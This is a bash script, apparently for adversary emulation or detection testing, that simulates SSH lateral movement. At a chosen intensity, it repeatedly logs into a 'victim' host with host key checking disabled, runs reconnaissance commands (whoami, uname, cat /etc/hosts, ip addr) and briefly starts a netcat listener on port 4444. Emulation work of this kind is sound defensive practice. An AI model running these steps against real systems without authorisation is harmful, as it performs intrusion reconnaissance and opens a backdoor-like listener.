#!/usr/bin/env bash
set -euo pipefail

VICTIM_IP="${1:?Usage: lateral_movement_ssh.sh <victim_ip> <username> <low|medium|high>}"
USERNAME="${2:?Usage: lateral_movement_ssh.sh <victim_ip> <username> <low|medium|high>}"
INTENSITY="${3:-medium}"

case "$INTENSITY" in
  low)    ROUNDS=2  ; DELAY=5 ;;
  medium) ROUNDS=5  ; DELAY=3 ;;
  high)   ROUNDS=10 ; DELAY=1 ;;
  *) echo "intensity must be low|medium|high"; exit 1 ;;
esac

echo "=== lateral_movement_ssh ($INTENSITY) ==="
echo "victim=${VICTIM_IP} user=${USERNAME} rounds=${ROUNDS}"
echo "start_ts=$(date -Iseconds)"

for i in $(seq 1 "$ROUNDS"); do
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        "${USERNAME}@${VICTIM_IP}" \
        "whoami; uname -a; cat /etc/hosts; ip addr; (timeout 2 nc -l -p 4444 >/dev/null 2>&1 &)" \
        2>/dev/null || true
    sleep "$DELAY"
done

echo "end_ts=$(date -Iseconds)"
echo "=== lateral_movement_ssh complete ==="